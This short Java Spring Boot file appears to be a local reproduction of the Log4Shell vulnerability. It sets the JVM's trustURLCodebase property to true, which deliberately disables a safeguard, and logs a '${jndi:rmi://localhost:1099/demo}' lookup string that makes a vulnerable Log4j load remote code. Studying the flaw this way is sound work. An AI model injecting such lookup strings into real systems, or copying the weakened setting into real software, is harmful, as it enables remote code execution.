package com.meijm.log4j2;

import lombok.extern.log4j.Log4j2;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@Log4j2
@SpringBootApplication
public class Log4J2Application {

    public static void main(String[] args) {
        log.info("Hello, ${java:os}");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        log.info("${jndi:rmi://localhost:1099/demo}");

        SpringApplication.run(Log4J2Application.class, args);
    }
}
